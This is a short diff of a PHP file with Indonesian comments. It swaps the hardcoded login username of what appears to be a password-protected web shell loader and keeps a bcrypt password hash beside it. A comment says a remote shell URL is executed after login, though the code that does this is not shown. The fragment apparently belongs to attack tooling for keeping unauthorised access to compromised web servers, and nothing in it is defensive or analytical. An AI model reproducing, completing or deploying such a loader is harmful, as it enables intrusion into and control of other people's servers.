@@ -2,7 +2,7 @@
 session_start();
 
 // ================== KONFIGURASI ==================
-$username    = "K1nG";
+$username    = "LypE23";
 $passwordHash = '$2a$19$8EY0PGbMvXLnQGiMty33X.XcbJDpeT0wyyv0QHODXkTAbVyh9vmfG'; // bcrypt hash
 
 // URL shell yang akan dieksekusi setelah login
